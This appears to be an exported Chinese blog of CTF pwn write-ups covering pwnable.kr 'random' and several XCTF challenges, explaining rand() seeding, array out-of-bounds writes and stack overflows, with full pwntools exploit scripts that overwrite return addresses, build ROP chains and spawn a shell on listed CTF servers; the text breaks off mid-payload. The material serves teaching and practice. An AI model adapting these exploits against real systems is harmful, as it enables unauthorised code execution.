    <content type="text"><![CDATA[0x00 相关知识点 1.rand()函数的“伪随机” 首先我们根据一个程序来认识rand()函数： 123456789101112#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;int main(int argc,char* argv[])&#123; int a,i; for(i=0;i&lt;5;i++)&#123; a = rand(); printf("a%d = %d\n",i,a); sleep(1); &#125;&#125; 我们多次运行该程序会得到如下结果： 我们可以从上面的结果可以看出不同的运行，产生的5个结果都是相对等的，这就说明了rand()函数产生的是伪随机数，这是由于rand函数内部**是通过一个公式计算出一个值作为随机值，下次再调用rand的时候，再把这个随机值作为参数传给这个公式计算出一个新的随机值，周而复始。**比如下方的代码： 1234567static unsigned long next=1; //静态全局变量，作为种子/* RAND_MAX assumed to be 32767 */int myrand(void) &#123; next = next * 1103515245 + 12345; return((unsigned)(next/65536) % 32768);&#125; 可以看出，在这里next变量在这里相当于一个seed，因为程序只要重新开始运行，“种子”值就会被默认赋值为1，那么通过公式算出来的数值肯定就一直相同了。那么下面我们就要引入srand()函数，现在在我们的代码的基础上，添加srand()函数，看一下运行结果如何，代码如下： 1234567891011121314#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;unistd.h&gt;#include&lt;time.h&gt;int main(int argc,char* argv[])&#123; int a,i; srand(time(NULL)); // 设置随机数种子 for(i=0;i&lt;5;i++) &#123; a = rand(); printf("a%d = %d\n",i,a); sleep(1); &#125;&#125; 运行结果如下： time(NULL)是指返回从1970年1.1日（元旦）午夜0点到现在的秒数，对于srand的输入每次都会不同，那么rand()和srand()的实现原理如下： 1234567891011static unsigned long next = 1;/* RAND_MAX assumed to be 32767 */int myrand(void) &#123; next = next * 1103515245 + 12345; return((unsigned)(next/65536) % 32768);&#125;void mysrand(unsigned seed) &#123; next = seed;&#125; 如果mysrand函数的参数是time(NULL)，也就是说rand函数每次运行时的种子是不同的，因此产生的随机数序列就不会相同了，但是这种是伪随机数，是可以预测的。要注意上面的并不是c库中的源码，下面给出c库中的源码： 123456789101112131415161718192021#include &lt;cruntime.h&gt;#include &lt;mtdll.h&gt;#include &lt;stddef.h&gt;#include &lt;stdlib.h&gt;void __cdecl srand ( unsigned int seed )&#123; _getptd()-&gt;_holdrand = (unsigned long)seed;&#125;int __cdecl rand ( void )&#123; _ptiddata ptd = _getptd(); return( ((ptd-&gt;_holdrand = ptd-&gt;_holdrand * 214013L + 2531011L) &gt;&gt; 16) &amp; 0x7fff );&#125; 0x01 题目分析 查看题目中给出的源码，如下： 123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; scanf("%d", &amp;key); if( (key ^ random) == 0xdeadbeef )&#123; printf("Good!\n"); system("/bin/cat flag"); return 0; &#125; printf("Wrong, maybe you should try 2^32 cases.\n"); return 0;&#125; 下面我们来详细的分析一下上述程序： 首先用rand函数设置一个伪随机数，但是没有用srand函数对种子进行初始化； 需要我们输入一个key变量； 将输入的key与生成的伪随机数进行异或，判断是否与0xdeadbeef值相等，如果相等就打印出flag 通过上述的分析，我们发现要想成功的打印出flag就必须使得我们输入的值与伪随机数异或以后的值为0xdeadbeef，在这里我们还应该要清楚异或的性质：a ⊕ b = c，那么 b = a ⊕ c，所以说 key = random ⊕ 0xdeadbeef，所以我们只需要知道random的值是多少即可求出key 0x02 解题步骤 1.写出脚本，算出key值 根据我们上文的分析，可以写出一个小的程序，来计算我们要求的key，脚本如下： 123456789#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; printf("%d",0xdeadbeef ^ random); &#125; 运行结果为-1255736440 2.输入结果，得到flag 得到如下的结果： 1234random@pwnable:~$ ./random -1255736440Good!Mommy, I thought libc random is unpredictable...]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【XCTF-pwn】stack2 writeup]]></title>
    <url>%2F2020%2F06%2F08%2F2020.06.08%EF%BC%88123%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00.相关知识点 1.retn 指令 格式：retn 功能：返回主程序。经常和call一起使用，当调用的过程结束后实现从过程返回至原调用程序的下一条指令，本指令不影响标志位 说明：由于在过程定义时，已指明其近(NEAR)或远(FAR)的属性,所以RET指令根据段内调用与段间调用,执行不同的操作 对段内调用：返回时，由堆栈弹出一个字的返回地址的段内偏移量至IP 对段外调用：返回时，由堆栈弹出的第一个字为返回地址的段内偏移量，将其送入IP中，由堆栈弹出第二个字为返回地址的段基址，将其送入CS中 举例 下面用一个简单的代码来说明一下retn的具体作用，代码如下： 12345678910111213#include&lt;stdio.h&gt;int fun()&#123; printf("This_is_a_function.\n"); return 0;&#125;int main()&#123; int s; s = fun(); printf("s is %d\n",s); return 0;&#125; main和fun函数的汇编代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243000011a9 &lt;fun&gt;: 0x565561a9 &lt;+0&gt;: push ebp 0x565561aa &lt;+1&gt;: mov ebp,esp 0x565561ac &lt;+3&gt;: push ebx 0x565561ad &lt;+4&gt;: sub esp,0x4 0x565561b0 &lt;+7&gt;: call 0x56556221 &lt;__x86.get_pc_thunk.ax&gt; 0x565561b5 &lt;+12&gt;: add eax,0x2e4b 0x565561ba &lt;+17&gt;: sub esp,0xc 0x565561bd &lt;+20&gt;: lea edx,[eax-0x1ff8] 0x565561c3 &lt;+26&gt;: push edx 0x565561c4 &lt;+27&gt;: mov ebx,eax 0x565561c6 &lt;+29&gt;: call 0x56556040 &lt;puts@plt&gt; 0x565561cb &lt;+34&gt;: add esp,0x10 0x565561ce &lt;+37&gt;: mov eax,0x0 0x565561d3 &lt;+42&gt;: mov ebx,DWORD PTR [ebp-0x4] 0x565561d6 &lt;+45&gt;: leave 0x565561d7 &lt;+46&gt;: ret 000011d8 &lt;main&gt;: 0x565561d8 &lt;+0&gt;: lea ecx,[esp+0x4] 0x565561dc &lt;+4&gt;: and esp,0xfffffff0 0x565561df &lt;+7&gt;: push DWORD PTR [ecx-0x4] 0x565561e2 &lt;+10&gt;: push ebp 0x565561e3 &lt;+11&gt;: mov ebp,esp 0x565561e5 &lt;+13&gt;: push ebx 0x565561e6 &lt;+14&gt;: push ecx 0x565561e7 &lt;+15&gt;: sub esp,0x10 0x565561ea &lt;+18&gt;: call 0x565560b0 &lt;__x86.get_pc_thunk.bx&gt; 0x565561ef &lt;+23&gt;: add ebx,0x2e11 0x565561f5 &lt;+29&gt;: call 0x565561a9 &lt;fun&gt; 0x565561fa &lt;+34&gt;: mov DWORD PTR [ebp-0xc],eax 0x565561fd &lt;+37&gt;: sub esp,0x8 0x56556200 &lt;+40&gt;: push DWORD PTR [ebp-0xc] 0x56556203 &lt;+43&gt;: lea eax,[ebx-0x1fe4] 0x56556209 &lt;+49&gt;: push eax 0x5655620a &lt;+50&gt;: call 0x56556030 &lt;printf@plt&gt; 0x5655620f &lt;+55&gt;: add esp,0x10 0x56556212 &lt;+58&gt;: mov eax,0x0 0x56556217 &lt;+63&gt;: lea esp,[ebp-0x8] 0x5655621a &lt;+66&gt;: pop ecx 0x5655621b &lt;+67&gt;: pop ebx 0x5655621c &lt;+68&gt;: pop ebp 0x5655621d &lt;+69&gt;: lea esp,[ecx-0x4] 0x56556220 &lt;+72&gt;: ret 观察main函数中调用fun函数时栈中的变化，如图所示： 从上图中可以看出，在进入fun函数之后，main+34偏移处的地址0x565561fa被放在了栈中，这也就是我们所说的返回地址，我们将断点打到0x565561d6处，也就是fun函数中的leave指令的地方，我们观察寄存器和栈中的情况。由于leave指令相当于movl %ebp %esp; popl %ebp，具体的如下图： 也就是说，**在执行到 ret 语句的时候，寄存器eip指向函数的返回地址，**知道这一点就可以了 2.数组溢出原理 如果没有检查数组的输入上界，那么很容易产生溢出，在C语言中，数组的元素下标是从0开始计算的，所以，对于n个元素的数组a[n]， 遍历它的时候是a[0],a[1],…,a[n-1]，如果遍历到a[n]，数组就溢出了。下面就用一个简单的例子进行说明，代码如下： 1234567891011#include "stdio.h"int main()&#123; int index; int array[3] = &#123;0x11, 0x22, 0x33&#125;; int a; printf("输入数组索引下标："); scanf("%d", &amp;index); printf("输出数组元素：array[%d] = 0x%x\n", index, array[index]); //数组越界读操作 //array[index] = 1 ; //数组越界写操作 return 0;&#125; 下面用GDB进行调试，在执行第7行前，该程序的栈的示意图如下： 通过GDB的调试，我们可以发现数组寻址的方式为：ebp+eax*4-0x18，其中0x18是数组array首地址ebp-0x18得来的，eax也就是我们要输入的下标，这里之所以是eax*4，是因为数组array的值是int类型，4个字节大小。 正常来说，我们要想输出array中的0x22的话，就需要我们输入下标1，使得ebp+eax*4-0x18=0xffffd8c8+1*4-0x18=0xffffd8b4，那么如果没有对输入的下标进行限制的话，那么就很有可能发生数组溢出的问题，比如这里我们可以输入下标为4，那么该程序会将0xffffd8c8+4*4-0x18=0xffffd8c0地址处的值0xffffd8e0打印出来，如下图所示： 以上就是数组溢出的一个原理了，在有的程序中，我们可以利用输入数组的值来达到改变eip的效果，本题就是一个很好的例子。 3.字符类型在数组中存放的形式（字符和字符字面值） 首先来问一个问题：计算机为什么用二进制和十六进制？[2] 因为二值信号可以很容易地被表示、存储和传输。例如，可以表示为穿孔卡片上有洞或无洞、导线上的高电压或低电压，或者顺时针或逆时针的磁场。而由于用二进制表示法太冗长，而十进制表示法与位模式的互相转换很麻烦，替代的方法是以16为基数，即十六进制（hexadecimal）。 再来问一个问题：什么是字符字面值？[2] 字面值就是一种记号而已，比如3，100，a,c，3.14。因为我们不能修改它（你能说把3改成5吗？）所以有时候又叫它常量。比如 int a = 100；a是一个int型变量，100就是一个字面值。字面值100只能用来作右值，不能作左值。C语言中字符字面值是由一对单引号括起来的单个字符，比如’a’、‘b’。实际上字符字面值和整型字面值是一样的。编译器把字符字面值都当做整型字面值处理。比如： 定义一个字符变量并用字符字面值来初始化：char ch = ‘a’；或者 char ch = 0x61； 定义一个int型变量并用字符字面值来初始化：int a = ‘a’；也是可以的，printf(&quot;%d&quot;,a);输出结果为97 总结如下： 字符型可以和整型可以相互转化，在C语言中字符型就是一种整型，因为在内存中存储的是二进制形式，可以被解析成字符和字符字面值两个含义； 字符字面值是由单引号括起来的单个字符； 上程序： 12345678910111213141516#include &lt;stdio.h&gt;int main()&#123; char a[5]="abcd"; int b = 'c'; a[1] = 0x62; if(a[0]==0x61) &#123; printf("a[0] == %c(char) == %d(int) == 0x%x(hex)\n",a[0],a[0],a[0]); printf("a[1] == %c(char) == %d(int) == 0x%x(hex)\n",a[1],a[1],a[1]); printf(" b == %c(char) == %d(int) == 0x%x(hex)\n",b,b,b); &#125; else printf("!=");&#125; 输出的结果为： 1234a[0] == a(char) == 97(int) == 0x61(hex)a[1] == b(char) == 98(int) == 0x62(hex) b == c(char) == 99(int) == 0x63(hex)Press any key to continue 从上面的代码运行结果中可以看出，对于char类型输入0x62，这个值被当作字符面值相当于给a[1]输入了字符’b’，在内存中以二进制01100010的形式进行存储着 0x01 题目分析 12# file stack stack: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d39da4953c662091eab7f33f7dc818f1d280cb12, not stripped 该文件是一个32位的ELF文件 1234567# checksec stack [*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/2/stack2/stack&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 开启了栈不可执行和金丝雀保护，也就是说我们无法使用栈溢出。使用IDA打开该文件，得到它的伪代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax@18 unsigned int v5; // [sp+18h] [bp-90h]@1 unsigned int v6; // [sp+1Ch] [bp-8Ch]@6 int v7; // [sp+20h] [bp-88h]@2 unsigned int j; // [sp+24h] [bp-84h]@5 int v9; // [sp+28h] [bp-80h]@1 unsigned int i; // [sp+2Ch] [bp-7Ch]@1 unsigned int k; // [sp+30h] [bp-78h]@13 unsigned int l; // [sp+34h] [bp-74h]@20 char v13[100]; // [sp+38h] [bp-70h]@2 int v14; // [sp+9Ch] [bp-Ch]@1 v14 = *MK_FP(__GS__, 20); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); v9 = 0; puts("***********************************************************"); puts("* An easy calc *"); puts("*Give me your numbers and I will return to you an average *"); puts("*(0 &lt;= x &lt; 256) *"); puts("***********************************************************"); puts("How many numbers you have:"); __isoc99_scanf("%d", &amp;v5); puts("Give me your numbers"); for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 99; ++i ) &#123; __isoc99_scanf("%d", &amp;v7); v13[i] = v7; &#125; for ( j = v5; ; printf("average is %.2lf\n", (double)((long double)v9 / (double)j), j) ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts("1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"); __isoc99_scanf("%d", &amp;v6); if ( v6 != 2 ) break; puts("Give me your number"); __isoc99_scanf("%d", &amp;v7); if ( j &lt;= 0x63 ) &#123; v3 = j++; v13[v3] = v7; &#125; &#125; if ( v6 &gt; 2 ) break; if ( v6 != 1 ) return 0; puts("id\t\tnumber"); for ( k = 0; k &lt; j; ++k ) printf("%d\t\t%d\n", k, v13[k]); &#125; if ( v6 != 3 ) break; puts("which number to change:"); __isoc99_scanf("%d", &amp;v5); puts("new number:"); __isoc99_scanf("%d", &amp;v7); v13[v5] = v7; &#125; if ( v6 != 4 ) break; v9 = 0; for ( l = 0; l &lt; j; ++l ) v9 += v13[l]; &#125; return 0;&#125; 仔细观察上述伪代码，可以发现在选择更改新的值的时候，没有对数组上界进行限制，产生了数组溢出漏洞；又在IDA中发现hackhere函数，里面调用了system(&quot;/bin/bash&quot;)函数，这里参考官方的writeup，指出：这个题有个坑点在于题目给出了getshell的函数，但是出题人在搭建docker环境时未注意，环境中只给了sh，在发现问题后考虑到题目依然可解就未再次更改环境。题目依然是简单的栈溢出，只不过不能直接跳转到getshell，需要简单的ROP一下。下面来确定v13与返回地址的偏移位置，v13是EBP-0x70,但是EIP却不是EBP+4,至于为什么, 有博主说这是因为开了Canary保护,需要动态调试计算这个偏移,下面来动态调试计算这个偏移。[1] 从上图可以看出该调试过程中的main函数ebp的地址为0xffffd8d8，而retn指令对应栈顶的地址为0xffffd8ec，也就是说返回地址的位置在0xffffd8ec，那么算下来两者之间差了0xffffd8ec-0xffffd8d8=0x14，这是因为开启了Canary的原因，正来说两者之间的差距应该为0x4，那么此时栈中的情况如下示意图： 上图中包含了很多信息，主要有： 返回地址相对于v13的偏移：0x84 解释了为什么是ebp+eax*1-0x70：因为v13是一个char类型的字符数组，每一个值占一个空间 那么下面我们来看看看怎么使得返回地址为system的地址，如下图： 同样上图也包含了很多信息： 因为是小端存储的方式，而system函数的地址为0x08048450，所以从低地址到高地址连续存储了0x50、0x84、0x04、0x08 要明白得到0x08048450的结果是图中所示求得的，那么两种方式是否有联系呢？以后再探讨 通过gdb调试，我们可以看到返回地址已经成为了system函数地址，那么下面我们需要找到system函数的参数位置，其中栈的情况如下， 从上图得知sh要写入的偏移是v13到返回地址的偏移再加上8[4]，我们进行gdb调试，看看是否能成功写入： 从上图中可以看出我们已经成功地将system和sh的地址写入到我们想写入的地方 0x02 解题步骤 根据上文的分析，我们找到system、sh的地址和v13相对于返回地址的偏移： 1234567retn_esp = 0xffffd8bcebp = 0xffffd8a8v13 = ebp - 0x70offset = retn_esp - ebp + 0x70print("[*] offset is",offset,"(",hex(offset),")")system_addr = [0x50,0x84,0x04,0x08]sh = [0x87,0x89,0x04,0x08] 这道题目前面几步的选择无关紧要，所以我们可以直接写出这部分的脚本： 123def start(): r.sendlineafter("How many numbers you have:\n","1") r.sendlineafter("Give me your numbers\n","1") 下面我们将system写入返回地址处，因为v13是一个字符类型的数组，所以我们需要地址分解为4部分，然后向连续的地址中进行写入： 1234567def Change_addr(offset,addr_part): r.sendlineafter("5. exit\n","3") r.sendlineafter("which number to change:\n",str(offset)) r.sendlineafter("new number:\n",str(addr_part)) for i in range(0,4): Change_addr(offset+i,system_addr[i]) 下面我们将sh写入system参数的正确的位置，和上一步一样： 123456def Change_addr(offset,addr_part): r.sendlineafter("5. exit\n","3") r.sendlineafter("which number to change:\n",str(offset)) r.sendlineafter("new number:\n",str(addr_part))for j in range(0,4): Change_addr(offset+j+8,sh[j]) # 一定要记得这里的偏移+8 结束程序运行，并与系统进行交互 123r.recvuntil("5. exit\n")r.sendline("5") r.interactive() 0x03 EXP 123456789101112131415161718192021222324252627282930313233343536373839404142#! python3#! /usr/bin/env python3#! coding: utf-8from pwn import *context(log_level="debug",arch="i386",os="linux",endian="little")r = remote("220.249.52.133",35029)retn_esp = 0xffffd8bcebp = 0xffffd8a8v13 = ebp - 0x70offset = retn_esp - ebp + 0x70print("[*] offset is",offset,"(",hex(offset),")")system_addr = [0x50,0x84,0x04,0x08]sh = [0x87,0x89,0x04,0x08]def start(): r.sendlineafter("How many numbers you have:\n","1") r.sendlineafter("Give me your numbers\n","1")def Change_addr(offset,addr_part): r.sendlineafter("5. exit\n","3") r.sendlineafter("which number to change:\n",str(offset)) r.sendlineafter("new number:\n",str(addr_part))if __name__ == "__main__": # 开始 start() # 向返回地址写入system地址 for i in range(0,4): Change_addr(offset+i,system_addr[i]) print("[*] offset is",offset) # 向system的参数位置写入sh地址 for j in range(0,4): Change_addr(offset+j+8,sh[j]) # 结束 r.recvuntil("5. exit\n") r.sendline("5") r.interactive() 0x04 Reference [1] 为什么C语言中数组下标越界不报错？ [2] 计算机为什么用二进制和十六进制 [3] C/C++处理十六进制数和字符串 [4] 攻防世界-Pwn进阶区(1)]]></content>
      <categories>
        <category>Binary</category>
      </categories>
      <tags>
        <tag>XCTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【XCTF-pwn】新手区writeup（part1）]]></title>
    <url>%2F2020%2F06%2F01%2F2020.06.01%EF%BC%88122%EF%BC%89%2F</url>
    <content type="text"><![CDATA[0x00 when_did_you_born 1.相关知识点 64位下的栈溢出原理 2.解题思路 12# file pwnpwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=718185b5ec9c26eb9aeccfa0ab53678e34fee00a, stripped pwn文件是一个64位的ELF可执行文件，也就是说在以后的分析中要注意这个条件C 123456789# file pwnpwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=718185b5ec9c26eb9aeccfa0ab53678e34fee00a, strippedroot@kali:~/Documents/CTF/PWN/XCTF/pwn/1/when_did_you)_pwn# checksec pwn[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/when_did_you)_pwn/pwn&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 没有开启地址随机化,，开启了cookie，开启了栈不可执行保护 从图中可以看出，要想成功的打印出flag，就需要满足v6 == 1926，但是前面有一个条件要满足v6!=1926，所以说程序要正常执行的话，肯定是不能打印出flag的，就需要我们想办法绕过第一个条件v6!=1926，我们看到后面还要我们输入一个v5的值，且v5位于ebp-0x20，而又因为v6位于ebp-0x18，这两个内存空间紧紧的连着，所以虽然开启了canary，但是我们这里也可以利用第二个输入点，实现栈溢出来绕过第一个条件，满足v6 == 1926 3.解题步骤 因为本题中较简单，看解题思路即可 4.EXP 123456789101112#!python#!/usr/bin/env pythonfrom pwn import *context(log_level="debug")r = remote("220.249.52.133",57772) # 包括本题及以下题目的exp中的ip地址和端口号需要更换题目中给出的r.recvuntil("What's Your Birth?")r.sendline("1111")r.recvuntil("What's Your Name?") # 到达溢出点payload = "a"*8 + str(p64(1926),encoding="unicode_escape")r.sendline(payload)r.interactive() 0x01 hello_pwn 1.相关知识点 地址偏移 2.解题思路 12# file pwnpwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=05ef7ecf06e02e7f199b11c4647880e8379e6ce0, stripped 该pwn文件是一个64位的ELF文件 1234567# checksec pwn[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/hello_pwn/pwn&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 就开启了一个栈不可执行 从上图中可以看到一个read函数和一个sub_400686()函数，而sub_400686()函数是打印出flag，所以只要满足dword_60106C == 1853186401即可，那么在这里dword_60106C表示的是什么意思呢？不知道没关系，下面我用gdb进行调试： 从上图中可以看出，如果要想执行sub_400686()函数，要使得eax中所指向的值和0x6e756161相等，而eax中存放的是0x60106c地址，那么到这里我们就应该清楚了dword_60106C和unk_601068分别表示的是0x60106c和0x601068地址中的值，两者相差4个字节，为了验证一下，在运行程序时，输入点的地方输入的是“AAAA1234567890”，分别看一下这两处地址的值为多少，结果如下图： 从上图可以看出0x601068地址的值为AAAA1234567890，而0x601068c地址处的值为1234567890，所以说我们可以利用这个来满足条件语句。 3.解题步骤 【见解题思路】 4.EXP 12345678910111213#! python#! usr/bin/env python#! coding: utf-8from pwn import *context(log_level="debug",endian="little",os="linux",arch="amd64")r = remote("220.249.52.133",37261) r.recvuntil("lets get helloworld for bof")payload = "A"*4 + str(p64(0x6E756161),encoding="unicode_escape")r.sendline(payload)r.recv()r.interactive() 0x02 level0 1.相关知识点 64位下传参顺序：前六个参数是通过rdi、rsi、rdx、rcx、r8、r9进行传参的，后面的就是通过栈进行传参 2.解题思路 12# file pwnpwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped 该文件是一个64位的ELF文件 1234567# checksec pwn[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/level0/pwn&apos; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 只开启了栈不可执行保护 1234567891011121314// main函数int __cdecl main(int argc, const char **argv, const char **envp)&#123; write(1, "Hello, World\n", 0xDuLL); return vulnerable_function();&#125;// vulnerable_function();函数ssize_t vulnerable_function()&#123; char buf; // [sp+0h] [bp-80h]@1 return read(0, &amp;buf, 0x200uLL);&#125; 可以从上图中发现，read函数存在着栈溢出的危险漏洞，我们可以从IDA中看到，该文件中有一个callsystem的函数，于是这道题目就相对容易了 3.解题步骤 【见解题思路】 4.EXP 12345678910111213141516171819#! python#! /usr/bin/env python3#! coding: utf-8from pwn import *context(arch="amd64",os="linux",log_level="debug")r = remote("220.249.52.133",52526)elf = ELF("./pwn")#system_addr = 0x400460system_addr_call = elf.symbols["callsystem"]#bin_sh_addr = 0x400684r.recvuntil("Hello, World\n")payload = 0x80*"a" + 8*"a" + str(p64(system_addr_call),encoding="unicode_escape")# payload = 0x80*"a" + 8*"a" + str(p64(system_addr),encoding="unicode_escape")+ 8*"a" + str(p64(bin_sh_addr),encoding="unicode_escape")r.sendline(payload)r.interactive() 5.存在的问题 为什么payload不能为payload = 0x80*&quot;a&quot; + 8*&quot;a&quot; + str(p64(system_addr),encoding=&quot;unicode_escape&quot;)+ 8*&quot;a&quot; + str(p64(bin_sh_addr),encoding=&quot;unicode_escape&quot;) 为什么exp还可以为下方所示： 12345678910111213141516#! python#! /usr/bin/env python3#! coding: utf-8from pwn import *context(arch="amd64",os="linux",log_level="debug")r = remote("220.249.52.133",52526)pop_rdi = 0x0000000000400663system_addr = 0x0000000000400460bin_sh_addr = 0x0000000000400684payload = 0x80*"a" + 8*"a" + str(p64(pop_rdi),encoding="unicode_escape") + str(p64(bin_sh_addr),encoding="unicode_escape") + str(p64(system_addr),encoding="unicode_escape")r.sendline(payload)r.interactive() 0x03 level2 1.相关知识点 栈溢出的条件：可以输入的大于分配的 函数调用时栈中的情况 2.解题思路 分析 123# file pwn pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped pwn文件是一个32位的ELF可执行文件 12345678# checksec pwn[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/level2/pwn&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 没有开启地址随机化和cookie，开启了栈不可执行保护 123456789101112131415161718// main 函数int __cdecl main(int argc, const char **argv, const char **envp)&#123; vulnerable_function(); system("echo 'Hello World!'"); return 0;&#125;// vulnerable_function()函数ssize_t vulnerable_function()&#123; char buf; // [sp+0h] [bp-88h]@1 system("echo Input:"); return read(0, &amp;buf, 0x100u);&#125; 从上面程序的源代码中可以看出，在vulnerable_function()函数中存在着栈溢出漏洞，因为buf被分配了0x88大小的空间，但实际能输入0x100大小，因此会造成溢出 3.解题步骤 对于本题来说，我们已经找到了溢出点，那么我们的解题思路如下： 找出“system”和”/bin/sh“的地址 构造出payload 找出system和/bin/sh的地址 123456789# ROPgadget --binary pwn --string &quot;system&quot;Strings information============================================================0x0804824b : system# ROPgadget --binary pwn --string &quot;/bin/sh&quot;Strings information============================================================0x0804a024 : /bin/sh 查找”system“函数和“/bin/sh”字符串的地址，可知system的地址为：0x0804824b，/bin/sh的地址为0x0804a024 构造payload 根据上述分析，我们可以构造如下payload 1payload = "a"*0x88 + "a"*4 + str(p32(system),encoding="unicode_escape") + "a"*4 + str(p32(/bin/sh),encoding="unicode_escape") &quot;a&quot;*0x88：这是buf要填充的字节 &quot;a&quot;*4：是填充Old Ebp的字节 str(p32(system),encoding=&quot;unicode_escape&quot;)：是system的地址 &quot;a&quot;*4：作为system函数的返回地址 str(p32(/bin/sh),encoding=&quot;unicode_escape&quot;)：是system参数/bin/sh的地址 4.EXP 1234567891011121314#!python#!/usr/bin/env pythonfrom pwn import *r = remote("124.126.19.106",35965)context(log_level="debug",os="linux",endian="little",arch="i386")r.recvuntil("Input:")payload = 0x88 * "a" + 4*"a" + str(p32(0x08048320),encoding="unicode_escape") + "a"*4 + str(p32(0x0804A024),encoding="unicode_escape")r.sendline(payload)r.interactive() 0x04 guess_num 1.相关知识点 srand()、rand()函数 python的ctypes外部函数库 2.解题思路 12# file guess_num guess_num: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c5689a0b4458c068fb51e3a2c167b112c3ba7323, stripped 该pwn文件也是一个64位的ELF文件 1234567# checksec guess_num [*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/guess_num/guess_num&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 几乎能开的保护全都开启了，所以这无疑增加了这道题目的难度 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; FILE *v3; // rdi@1 __int64 v4; // rax@1 const char *v5; // rdi@1 __int64 result; // rax@7 __int64 v7; // rsi@7 int v8; // [sp+4h] [bp-3Ch]@1 int i; // [sp+8h] [bp-38h]@1 int v10; // [sp+Ch] [bp-34h]@1 char v11; // [sp+10h] [bp-30h]@1 unsigned int seed[2]; // [sp+30h] [bp-10h]@1 __int64 v13; // [sp+38h] [bp-8h]@1 v13 = *MK_FP(__FS__, 40LL); setbuf(stdin, 0LL); setbuf(stdout, 0LL); v3 = stderr; setbuf(stderr, 0LL); v8 = 0; v10 = 0; LODWORD(v4) = sub_BB0(v3, 0LL); *(_QWORD *)seed = v4; puts("-------------------------------"); puts("Welcome to a guess number game!"); puts("-------------------------------"); puts("Please let me know your name!"); printf("Your name:"); gets(&amp;v11); v5 = (const char *)seed[0]; srand(seed[0]); for ( i = 0; i &lt;= 9; ++i ) &#123; v10 = rand() % 6 + 1; printf("-------------Turn:%d-------------\n", (unsigned int)(i + 1)); printf("Please input your guess number:"); __isoc99_scanf("%d", &amp;v8); puts("---------------------------------"); if ( v8 != v10 ) &#123; puts("GG!"); exit(1); &#125; v5 = "Success!"; puts("Success!"); &#125; sub_C3E(v5); result = 0LL; v7 = *MK_FP(__FS__, 40LL) ^ v13; return result;&#125; 我们采用逆推的思想，从上面的源代码可以看出，要想输出“Success”，就必须使得我们10次的输入与随机化产生的数值要想等，在之前还要输入一个name变量的字符串，可以看出gets()是一个危险函数，因为他不判断输入的长度，所以我们可以利用这一点。 再来看一下seed[2]的起始位置bp-10h，以及v11的位置bp-30h，所以说seed[0]的位置为ebp-10h，seed[1]的位置为ebp-20h，我们是不是可以通过gets函数，来改变seed[0]的值呢？答案是可以的，虽然开启了金丝雀和栈不可执行，但是这两个空间是一个连续空间，金丝雀并不会产生影响。 我们根据赋的值自己生成一下产生的10个（伪）随机数值，然后我们就可以获得flag 3.解题步骤 假如seed[0]被我们填充的为3时，产生的数值是什么？我们写了一个下面的脚本： 123456789#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(int argc,char* argv[])&#123; int i; srand(3); for(i=0;i &lt;=9;i++)&#123; printf("%d\n",rand()%6+1); &#125;&#125; 产生的数字为：1、2、1、1、4、5、1、5、2、5。那么下面我们可以写出我们的payload 12345678910from pwn import *r = remote("124.126.19.106",49881)payload = 0x20 